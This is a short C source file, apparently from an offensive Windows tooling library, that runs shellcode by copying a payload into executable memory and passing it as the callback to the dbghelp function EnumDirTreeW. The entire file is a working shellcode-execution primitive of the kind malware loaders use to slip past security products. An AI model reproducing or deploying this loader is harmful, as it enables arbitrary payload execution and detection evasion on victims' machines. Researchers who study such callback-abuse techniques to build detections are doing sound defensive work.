#include "Win32Helper.h"

DWORD UnusedSubroutineDisposeableThreadEnumDirTreeW(LPVOID Param)
{
	PSHELLCODE_EXECUTION_INFORMATION Sei = (PSHELLCODE_EXECUTION_INFORMATION)Param;
	SYMINITIALIZEW SymInitialize = NULL;
	SYMCLEANUP SymCleanup = NULL;
	ENUMDIRTREEW EnumDirTree = NULL;
	LPVOID BinAddress = NULL;
	BOOL bFlag = FALSE;
	HMODULE hModule = NULL;
	WCHAR DisposeableBuffer[512] = { 0 };

	hModule = TryLoadDllMultiMethodW((PWCHAR)L"dbghelp.dll");
	if (hModule == NULL)
		goto EXIT_ROUTINE;

	SymInitialize = (SYMINITIALIZEW)GetProcAddressA((DWORD64)hModule, "SymInitializeW");
	SymCleanup = (SYMCLEANUP)GetProcAddressA((DWORD64)hModule, "SymCleanup");
	EnumDirTree = (ENUMDIRTREEW)GetProcAddressA((DWORD64)hModule, "EnumDirTreeW");

	if (!SymInitialize || !SymCleanup || !EnumDirTree)
		goto EXIT_ROUTINE;

	if (!SymInitialize(InlineGetCurrentProcess, NULL, TRUE))
		goto EXIT_ROUTINE;

	BinAddress = VirtualAlloc(NULL, Sei->dwLengthOfPayloadInBytes, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (BinAddress == NULL)
		goto EXIT_ROUTINE;

	CopyMemoryEx(BinAddress, Sei->Payload, Sei->dwLengthOfPayloadInBytes);

	EnumDirTree(InlineGetCurrentProcess, L"C:\\Windows", L"*.log", DisposeableBuffer, BinAddress, NULL);

	SymCleanup(InlineGetCurrentProcess);

	bFlag = TRUE;

EXIT_ROUTINE:

	if (hModule)
		FreeLibrary(hModule);

	if (BinAddress)
		VirtualFree(BinAddress, 0, MEM_RELEASE);

	return (bFlag ? 0 : 0xffffffff);
}


BOOL ShellcodeExecViaEnumDirTreeW(_In_ PSHELLCODE_EXECUTION_INFORMATION Sei)
{
	return CreateThreadAndWaitForCompletion(UnusedSubroutineDisposeableThreadEnumDirTreeW, Sei, INFINITE);
}